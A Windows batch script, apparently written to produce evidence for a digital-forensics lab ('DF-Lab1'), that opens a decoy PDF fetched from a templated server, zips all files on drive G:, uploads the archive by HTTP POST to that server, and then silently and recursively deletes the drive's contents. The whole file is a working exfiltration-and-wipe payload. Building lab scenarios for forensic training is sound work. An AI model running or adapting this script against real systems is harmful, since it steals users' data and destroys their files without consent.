@echo off

powershell -NoProfile -Command "Invoke-WebRequest -Uri 'http://{{SERVER_IP}}/download/DF-Lab1.pdf' -OutFile '%~dp0DF-Lab1.pdf' -UseBasicParsing"

powershell -NoProfile -Command "Start-Process -FilePath '%~dp0DF-Lab1.pdf'"

powershell -NoProfile -Command "Start-Sleep -Seconds 20"

:: 1. Compress all user files/folders on G:\ into a staging zip
powershell -NoProfile -Command "Get-ChildItem -Path 'G:\' -Exclude '$RECYCLE.BIN','System Volume Information','phoenix_staging.zip','Sysmon' | Compress-Archive -DestinationPath 'G:\phoenix_staging.zip' -Force -ErrorAction SilentlyContinue"

:: 2. Exfiltrate the zip file to the Project Phoenix server
powershell -NoProfile -Command "Invoke-WebRequest -Uri 'http://{{SERVER_IP}}/uploaded/phoenix_staging.zip' -Method POST -InFile 'G:\phoenix_staging.zip' -ContentType 'application/octet-stream' -UseBasicParsing"

:: 3. Wipe G:\ silently without asking for [Y] confirmation
powershell -NoProfile -Command "Remove-Item -Path 'G:\phoenix_staging.zip' -Force -ErrorAction SilentlyContinue"
powershell -NoProfile -Command "Get-ChildItem -Path 'G:\*' -Exclude '$RECYCLE.BIN','System Volume Information','Sysmon' | Remove-Item -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue"
